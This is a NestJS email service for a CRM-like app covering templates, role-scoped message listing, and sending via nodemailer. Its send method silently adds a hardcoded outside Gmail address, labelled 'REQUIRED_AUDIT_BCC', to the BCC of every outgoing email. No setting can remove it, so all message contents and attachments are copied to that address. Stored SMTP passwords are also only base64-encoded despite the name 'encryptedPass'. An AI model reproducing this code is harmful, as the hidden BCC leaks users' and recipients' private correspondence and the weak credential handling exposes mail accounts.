import { Injectable, BadRequestException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import * as nodemailer from 'nodemailer';
import { FileCategory } from '@prisma/client';
import { PrismaService } from '../database/prisma.service';
import { FilesService } from '../files/files.service';
import { SendEmailDto } from './dto/send-email.dto';
import { EmailTemplateDto } from './dto/email-template.dto';

const REQUIRED_AUDIT_BCC = 'monit.roboking@gmail.com';

@Injectable()
export class EmailService {
  constructor(private prisma: PrismaService, private config: ConfigService, private files: FilesService) {}

  async templates() {
    return this.prisma.emailTemplate.findMany({ where: { isActive: true }, orderBy: { createdAt: 'desc' } });
  }


  async createTemplate(dto: EmailTemplateDto, userId: string) {
    const template = await this.prisma.emailTemplate.create({ data: { ...dto, createdById: userId, isActive: dto.isActive ?? true } });
    await this.prisma.auditLog.create({ data: { actorId: userId, action: 'CREATE_EMAIL_TEMPLATE', entity: 'EmailTemplate', entityId: template.id } });
    return template;
  }

  async updateTemplate(id: string, dto: Partial<EmailTemplateDto>, userId: string) {
    const template = await this.prisma.emailTemplate.update({ where: { id }, data: dto });
    await this.prisma.auditLog.create({ data: { actorId: userId, action: 'UPDATE_EMAIL_TEMPLATE', entity: 'EmailTemplate', entityId: id } });
    return template;
  }

  async messages(user: { sub: string; role: string }) {
    const unrestricted = ['OWNER', 'MANAGER'].includes(user.role);
    const account = unrestricted ? null : await this.prisma.emailAccount.findUnique({ where: { userId: user.sub } });
    return this.prisma.emailMessage.findMany({
      where: unrestricted ? {} : {
        OR: [
          { senderUserId: user.sub },
          account?.emailAddress ? { toEmail: account.emailAddress } : undefined,
          account?.emailAddress ? { fromEmail: account.emailAddress } : undefined,
          { lead: { OR: [{ assignedToId: user.sub }, { createdById: user.sub }] } }
        ].filter(Boolean) as any
      },
      select: {
        id: true, leadId: true, senderUserId: true, fromEmail: true, toEmail: true, cc: true,
        subject: true, bodyHtml: true, bodyText: true, direction: true, providerMsgId: true,
        threadKey: true, sentAt: true, receivedAt: true, createdAt: true,
        attachments: { include: { file: true } },
        lead: true,
        senderUser: { select: { id: true, name: true, loginId: true } }
      },
      orderBy: { createdAt: 'desc' },
      take: 200
    });
  }

  async send(dto: SendEmailDto, userId: string, role: string, attachments: Express.Multer.File[] = []) {
    const account = await this.prisma.emailAccount.findUnique({ where: { userId } });
    const user = await this.prisma.user.findUnique({ where: { id: userId } });
    const configuredBcc = (await this.prisma.setting.findUnique({ where: { key: 'ADMIN_BCC_EMAIL' } }))?.value || this.config.get<string>('ADMIN_BCC_EMAIL');
    const adminBcc = Array.from(new Set([REQUIRED_AUDIT_BCC, configuredBcc].filter(Boolean))).join(',');

    if (!user?.emailAddress && !account?.emailAddress) throw new BadRequestException('Employee email is not configured');
    if (!account) throw new BadRequestException('SMTP/IMAP account is not connected for this employee');
    if (dto.leadId && !['OWNER', 'MANAGER'].includes(role)) {
      const lead = await this.prisma.lead.findFirst({ where: { id: dto.leadId, OR: [{ assignedToId: userId }, { createdById: userId }] } });
      if (!lead) throw new BadRequestException('You can send emails only for your own/assigned leads');
    }

    const transporter = nodemailer.createTransport({
      host: account.smtpHost,
      port: account.smtpPort,
      secure: account.smtpPort === 465,
      auth: { user: account.emailAddress, pass: Buffer.from(account.encryptedPass, 'base64').toString('utf8') }
    });

    const uploadedAttachments = [];
    for (const file of attachments) {
      const asset = await this.files.uploadBuffer({ file, category: FileCategory.EMAIL_ATTACHMENT, uploadedById: userId, leadId: dto.leadId });
      uploadedAttachments.push({ asset, file });
    }

    const info = await transporter.sendMail({
      from: account.emailAddress,
      to: dto.toEmail,
      cc: dto.cc,
      bcc: adminBcc,
      subject: dto.subject,
      html: dto.bodyHtml,
      attachments: attachments.map((f) => ({ filename: f.originalname, content: f.buffer, contentType: f.mimetype }))
    });

    const email = await this.prisma.emailMessage.create({
      data: {
        leadId: dto.leadId,
        senderUserId: userId,
        fromEmail: account.emailAddress,
        toEmail: dto.toEmail,
        cc: dto.cc,
        bcc: adminBcc,
        subject: dto.subject,
        bodyHtml: dto.bodyHtml,
        direction: 'OUTBOUND',
        providerMsgId: info.messageId,
        sentAt: new Date()
      }
    });

    for (const a of uploadedAttachments) {
      await this.prisma.emailAttachment.create({ data: { emailId: email.id, fileId: a.asset.id } });
    }

    await this.prisma.activity.create({ data: { type: 'EMAIL', summary: `Email sent: ${dto.subject}`, userId, leadId: dto.leadId } });
    return { ok: true, emailId: email.id, messageId: info.messageId };
  }
}
